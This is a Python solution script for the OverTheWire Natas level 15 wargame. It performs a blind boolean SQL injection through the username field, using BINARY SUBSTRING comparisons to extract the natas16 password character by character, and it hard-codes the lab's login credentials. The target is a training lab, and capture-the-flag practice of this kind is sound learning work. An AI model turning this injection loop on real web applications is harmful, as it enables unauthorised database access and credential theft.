import requests
import string

PASS_LEN=32

basicAuth=requests.auth.HTTPBasicAuth('natas15','SdqIqBsFcz3yotlNYErZSZwblkm0lrvx')

u="http://natas15.natas.labs.overthewire.org/"

count=1
password=[]

CHARS=string.ascii_letters+string.digits
char_pos=0

#We check substring for first {count} letters and on confirmation check {count+1}
while(count<=32):
    if(len(password)<count):
        password.append(CHARS[char_pos])
    else:
        password[count-1]=CHARS[char_pos]

    payload={
        'username':f"\" OR (username='natas16' AND BINARY SUBSTRING(password,1,{count}) = '{''.join(password)}' )  -- ",
    }


    response=requests.post(u,data=payload,auth=basicAuth)
    # print(response.text)
    # print(payload)

    if "This user exists" in response.text:
        print(f"Count {count}: Password {''.join(password)}")
        char_pos=0
        count+=1

    char_pos+=1
    if(char_pos>=len(CHARS)):
        print("No valid character found")
        break